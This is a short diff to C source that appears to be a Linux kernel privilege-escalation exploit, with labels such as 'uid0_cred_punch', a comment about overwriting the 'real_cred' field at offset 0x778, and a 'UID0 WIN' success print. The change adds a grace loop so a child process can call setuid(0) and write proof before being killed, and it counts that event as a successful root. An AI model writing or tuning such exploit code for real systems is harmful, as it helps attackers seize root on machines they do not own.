@@ -2598,6 +2598,10 @@ uid0_cred_punch:;
   if (g_uid0_flag_page) {
     *(volatile uint32_t *)g_uid0_flag_page = 1;
     __sync_synchronize();
+    /* Grace: the woken child needs a moment to setuid(0)+write proof
+     * before the miss path below SIGKILLs it. */
+    for (int gw = 0; gw < 20 && !uid0_payload_fired(); gw++)
+      usleep(150000);
   }
 
   /* DOUBLE PUNCH (09-13): 0x778 real_cred lands ~always but is status-only;
@@ -2670,7 +2674,7 @@ uid0_cred_punch:;
   }
 
   if (self_uid == 0 || (uint32_t)geteuid() == 0 || child_uid == 0 ||
-      self_status == 0 || status_uid == 0) {
+      self_status == 0 || status_uid == 0 || uid0_payload_fired()) {
     pr_success("UID0 WIN getuid=%u euid=%u self_status=%u child=%u who=%s\n",
                self_uid, (uint32_t)geteuid(), self_status, child_uid, who);
     durable_stage("uid0_WIN");
